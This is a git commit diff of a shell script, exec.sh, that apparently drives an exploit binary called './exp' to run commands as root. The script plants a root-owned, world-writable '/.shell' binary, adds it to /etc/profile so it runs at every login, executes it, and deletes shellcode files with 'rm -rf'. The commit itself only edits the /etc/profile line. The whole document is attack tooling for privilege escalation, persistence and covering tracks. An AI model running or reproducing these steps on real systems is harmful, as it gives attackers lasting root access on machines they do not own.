baae3d6044c7b45fea0c4cb10587bc394a37d114
hehekun <41153628+hehekun@users.noreply.github.com>
2019-07-11 11:47:25 +0800

    Update exec.sh

--- exec.sh
+++ exec.sh
@@ -3,6 +3,6 @@ chmod +x ./exp
 ./exp "mv ./shell /.shell"
 ./exp "chown root /.shell"
 ./exp "chmod 777 /.shell"
-./exp "echo /.shell >> /etc/profile"
+./exp "echo /.shell & >> /etc/profile"
 ./exp "/.shell"
 ./exp "rm -rf ../shellcode"
